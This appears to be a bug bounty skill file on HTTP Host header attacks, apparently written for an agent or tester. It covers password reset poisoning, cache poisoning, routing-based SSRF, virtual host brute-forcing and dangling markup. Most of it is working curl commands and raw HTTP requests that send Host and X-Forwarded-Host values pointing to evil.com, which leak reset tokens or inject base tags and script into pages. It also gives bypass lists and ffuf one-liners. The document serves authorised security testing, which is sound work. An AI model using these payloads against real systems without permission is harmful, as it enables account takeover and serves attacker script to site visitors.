---
name: host-header-attacks
description: "HTTP Host header attack testing — password reset poisoning for token theft, cache poisoning via X-Forwarded-Host, routing-based SSRF, virtual host discovery, and dangling markup injection. Use when testing password reset email flows, CDN-fronted sites, or multi-tenant platforms sharing a single IP."
---

# HTTP Host Header Attacks

## Crown Jewel Targets

- **Apps with password reset functionality** -- Host header reflected in reset email link = token theft = ATO (the most reportable Host header attack)
- **Sites behind CDN/cache** (Cloudflare, Akamai, Fastly) -- Host reflected in cached response = stored XSS via poisoned JS/link URLs serving all users
- **Multi-tenant platforms** sharing single IP -- virtual host brute-force discovers admin panels, staging environments, internal APIs
- **Django apps with `ALLOWED_HOSTS = ['*']`** -- `request.get_host()` returns attacker-controlled value, used in link generation
- **Node.js/Express apps** -- `req.headers.host` is raw user input, often used for URL construction without validation
- **IIS with URL Rewrite module** -- `X-Original-URL` and `X-Rewrite-URL` bypass path-based ACLs (access `/admin` via header override)
- **HTTP/2 targets behind reverse proxies** -- connection state attacks exploit keep-alive to route to internal vhosts

## Attack Surface Signals

- **URL patterns**: `/forgot-password`, `/reset-password`, `/password-reset`, any form that sends emails with links
- **Response signals**: Host value reflected in `<a href=`, `<base href=`, `<script src=`, `Location:` header
- **Headers to test**: `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded: host=`, `X-Original-URL`, `X-Rewrite-URL`
- **Tech signals**: cache headers (`X-Cache`, `Age`, `Vary`), Django/Rails/Spring/Express in stack

## Why 40% Accept Rate

Most Host header injection reports are rejected because:
- "Host reflected in response" alone = informational, not exploitable
- Programs require proven exploitation chain (password reset poisoning, cache poisoning)
- Modern frameworks ignore user-supplied Host for link generation
- CDN/reverse proxy normalizes Host before it reaches the app
- Browser-based attacks rarely succeed (browsers auto-set Host from URL)

## Detection

### Quick probe — inject and observe

```bash
# Basic Host header injection test
curl -sk "https://target.com/" -H "Host: evil.com" -D- | head -30

# Check if Host is reflected in response body (links, redirects, meta tags)
curl -sk "https://target.com/" -H "Host: evil.com" | grep -i "evil.com"

# Check Location header on redirects
curl -skI "https://target.com/login" -H "Host: evil.com" | grep -i "location"

# Test override headers (more likely to work through proxies)
curl -sk "https://target.com/" -H "X-Forwarded-Host: evil.com" | grep -i "evil.com"
curl -sk "https://target.com/" -H "X-Host: evil.com" | grep -i "evil.com"
curl -sk "https://target.com/" -H "Forwarded: host=evil.com" | grep -i "evil.com"
```

### Override headers to test (try ALL of these)

```
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
X-HTTP-Host-Override: evil.com
X-Original-URL: /admin
X-Rewrite-URL: /admin
Forwarded: host=evil.com
X-Forwarded-Port: 4443
X-Forwarded-Scheme: nothttps
```

### Duplicate Host header

```bash
# Some servers use first, some use last, some concatenate
curl -sk "https://target.com/" -H "Host: target.com" -H "Host: evil.com"
```

### Absolute URL with different Host

```bash
# HTTP/1.1 allows absolute URL in request line — Host header may be ignored
curl -sk --request-target "https://target.com/path" "https://target.com/" -H "Host: evil.com"
```

## Attack Vectors

### A. Password Reset Poisoning

**The most impactful and reportable Host header attack.**

```
Flow:
1. Attacker initiates password reset for victim@target.com
2. Attacker modifies Host header to attacker-controlled domain
3. Server generates reset link using attacker's Host value
4. Victim receives email: https://evil.com/reset?token=SECRET_TOKEN
5. Victim clicks → token sent to attacker's server
6. Attacker uses token on real target to reset victim's password
```

**PoC Steps:**

```bash
# Step 1: Capture password reset request in Burp
POST /forgot-password HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com

# Step 2: If Host doesn't work, try override headers
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com

# Step 3: Check email (use your own email for PoC)
# If reset link contains evil.com → confirmed

# Step 4: Prove token works — visit real reset URL with stolen token
GET /reset?token=SECRET_TOKEN HTTP/1.1
Host: target.com
```

**Dangling markup variant** (when Host partially reflected):

```bash
# If Host injected into HTML attribute, use dangling markup
POST /forgot-password HTTP/1.1
Host: target.com:'<a href="//evil.com/?
Content-Type: application/x-www-form-urlencoded

email=victim@target.com

# Result in email HTML: <a href="https://target.com:'<a href="//evil.com/?...token=SECRET">
# Browser follows attacker link, leaking token in URL
```

### B. Web Cache Poisoning via Host

```bash
# Step 1: Inject Host to alter cached response
curl -sk "https://target.com/static-page" \
  -H "X-Forwarded-Host: evil.com" \
  -H "X-Cache-Buster: unique123"

# Step 2: Check if response includes evil.com in links/scripts
# If <script src="//evil.com/app.js"> or <a href="https://evil.com/...">

# Step 3: Fetch without injection — if poisoned response served to clean request
curl -sk "https://target.com/static-page" | grep "evil.com"
# If evil.com appears → cache poisoned → all users get attacker content

# Step 4: Escalate to XSS via poisoned JavaScript src
# Host attacker server with malicious JS → stored XSS on every page load
```

### C. SSRF via Routing-Based Attacks

```bash
# Supply internal hostname → application routes internally
GET /api/data HTTP/1.1
Host: internal-admin.target.local

# Or use absolute URL to bypass Host validation
GET https://target.com/api/data HTTP/1.1
Host: internal-admin.target.local

# Collaborate with connection reuse (HTTP/2 or keep-alive)
# First request authenticates, second request with modified Host routes internally
```

### D. Connection State Attacks (HTTP/2 and Keep-Alive)

```bash
# HTTP/2 connection coalescing abuse
# Step 1: Establish connection to target.com (TLS cert covers *.target.com)
# Step 2: Send request with Host: admin.target.com on same connection
# Step 3: Load balancer may route to admin vhost using existing authenticated connection

# Keep-alive poisoning (HTTP/1.1)
# First request: legitimate, establishes session
GET / HTTP/1.1
Host: target.com
Connection: keep-alive

# Second request on same connection: modified Host
GET /admin HTTP/1.1
Host: admin-internal.target.com
```

### E. Virtual Host Discovery via Host Brute-Force

```bash
# Brute-force Host header to find hidden vhosts
# Using ffuf
ffuf -u https://TARGET_IP/ -H "Host: FUZZ.target.com" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 0 -mc all -fc 400

# Common hidden vhosts
admin.target.com, staging.target.com, dev.target.com
internal.target.com, api-internal.target.com, jenkins.target.com
grafana.target.com, kibana.target.com, prometheus.target.com
```

### F. Dangling Markup Injection via Host

```bash
# When Host is reflected in HTML without encoding
# Inject partial HTML that captures subsequent content

# If reflected in: <img src="https://HOST/logo.png">
curl -sk "https://target.com/" -H 'Host: evil.com/logo.png"><script>alert(1)</script><img src="x'

# If reflected in <link> or <base> tag
curl -sk "https://target.com/" -H 'Host: evil.com"><base href="https://evil.com/">'
# All relative URLs now resolve to attacker's server
```

### G. Port-Based Routing Bypass

```bash
# Add port to Host to bypass security controls
curl -sk "https://target.com/admin" -H "Host: target.com:8443"
curl -sk "https://target.com/admin" -H "Host: target.com:@evil.com"
curl -sk "https://target.com/admin" -H "Host: target.com:evil.com"

# X-Forwarded-Port override
curl -sk "https://target.com/" -H "X-Forwarded-Port: 8080"
# May cause redirect to http://target.com:8080/ exposing debug/admin interface
```

## Server-Specific Behaviors

| Server | Host Handling | Notes |
|--------|--------------|-------|
| **Nginx** | First `Host` header wins; `server_name` matching; `$host` = first Host | `proxy_set_header Host $host` passes user-controlled value upstream |
| **Apache** | `ServerName`/`ServerAlias` matching; unmatched → default vhost | Default vhost often exposes admin panels or debug info |
| **IIS** | URL Rewrite module respects `X-Original-URL`, `X-Rewrite-URL` | Can bypass path-based ACLs: `GET /allowed -H "X-Original-URL: /admin"` |
| **Tomcat** | Semicolon path parameters: `/admin;foo=bar` | Host header used in `request.getServerName()` for redirect generation |
| **Node.js** | `req.headers.host` = raw user input (Express, Koa) | If app uses `req.headers.host` for URL construction → injectable |
| **Django** | `ALLOWED_HOSTS` setting; if `['*']` → vulnerable | `request.get_host()` returns user-controlled Host |
| **Rails** | `config.hosts` whitelist (Rails 6+); older = vulnerable | `request.host` can return injected value |
| **Spring** | `ForwardedHeaderFilter` trusts `X-Forwarded-*` by default | Must explicitly disable or restrict |

## Bypass Techniques

### When basic Host injection is blocked

```bash
# 1. Use override headers instead
X-Forwarded-Host: evil.com

# 2. Inject port in Host
Host: target.com:evil.com

# 3. Add trailing dot (DNS allows it)
Host: target.com.

# 4. Mixed case
Host: TARGET.com

# 5. Subdomain injection
Host: evil.target.com

# 6. Tab/space injection before Host value
Host:  evil.com

# 7. Use @-based URL confusion
Host: target.com@evil.com

# 8. Supply two Host headers
Host: target.com
Host: evil.com
```

## Impact Requirements

**Host header injection alone = almost always REJECT.** Must prove one of:

| Impact | Severity | Required Proof |
|--------|----------|----------------|
| Password reset poisoning → ATO | **Critical** | Email with attacker-controlled link + token works on real endpoint |
| Web cache poisoning → stored XSS | **Critical** | Poisoned response served to other users, JS execution proven |
| Web cache poisoning → DoS | **High** | Error response cached, affecting all users |
| SSRF via internal routing | **High-Critical** | Internal service accessed, data exfiltrated |
| Virtual host access → admin panel | **High** | Authenticated or sensitive functionality reached |
| Open redirect via Host | **Low (reject)** | Only accept if chained into OAuth token theft |
| Host reflected in response | **Informational (reject)** | Never accept standalone |

## Triage Checklist

- [ ] Host header injection confirmed (reflected in response body, headers, or emails)
- [ ] Exploitation chain demonstrated (not just "Host reflected" — must be password reset poisoning, cache poisoning, SSRF, or vhost access)
- [ ] Browser verification completed (Playwright confirms the attack works from a real browser, not just curl)
- [ ] Impact on other users proven (cache poisoning affects clean requests; password reset email contains attacker domain)
- [ ] Server-specific behavior documented (which server, which header, which behavior)
- [ ] Not mitigated by CDN/WAF in production (test through actual infrastructure, not direct-to-origin)

## PortSwigger Academy — Advanced Techniques

- **Connection state attacks**: HTTP/1.1 keep-alive or HTTP/2 — first request legitimate, follow-up with malicious Host on same connection
- **Absolute URL with conflicting Host**: `GET https://legitimate.com/ HTTP/1.1\r\nHost: evil.com` — proxy vs backend desync
- **Malformed request line**: `GET @evil.com/path HTTP/1.1` — middleware falls back to Host
- **Virtual host brute-forcing**: Cycle Host values against single IP to enumerate internal apps
- **Authentication bypass**: `Host: localhost` may bypass admin panel IP checks
- **Full override headers list**: X-Forwarded-Host, X-Host, X-Forwarded-Server, X-HTTP-Host-Override, `Forwarded: host=evil.com`

## Operator Notes (Battle-Tested)

1. **Host header injection alone is ALMOST ALWAYS REJECTED (MEMORY.md lesson)** -- "Host reflected in response" is informational. You MUST prove a full exploitation chain: password reset poisoning with token capture, cache poisoning affecting other users, or SSRF to internal services.
2. **Browser verification is mandatory ()** -- browsers auto-set Host from the URL, so Host injection attacks do not work from a browser in most cases. The attack vector requires an intercepting proxy (Burp) or specific scenarios (cache poisoning where the poisoned response is served to clean browser requests).
3. **Test ALL override headers, not just Host** -- `X-Forwarded-Host` works far more often than raw Host injection because reverse proxies (Nginx, Apache) pass it upstream untouched. Test the full list: XFH, X-Host, X-Forwarded-Server, Forwarded, X-Original-URL, X-Rewrite-URL.
4. **Virtual host brute-force with ffuf** -- `ffuf -u https://TARGET_IP/ -H "Host: FUZZ.target.com" -w subdomains.txt -fs 0 -mc all -fc 400`. This discovers internal admin panels, staging environments, and monitoring dashboards that DNS does not resolve publicly.
5. **Password reset poisoning requires email verification** -- use your own email for PoC. If the reset link contains your injected domain, capture the token, then prove it works on the real reset endpoint. Screenshot the email as evidence.

## Related Skills & Chains

| When | Go to |
|------|-------|
| Cache poisoning via Host header | `cache-poisoning` |
| Password reset flow to test | `auth-bypass-testing` |
| Host routes to internal service (SSRF) | `ssrf-testing` |
| Connection state attack via HTTP/2 | `request-smuggling` |
| CRLF in Host header value | `crlf-injection` |
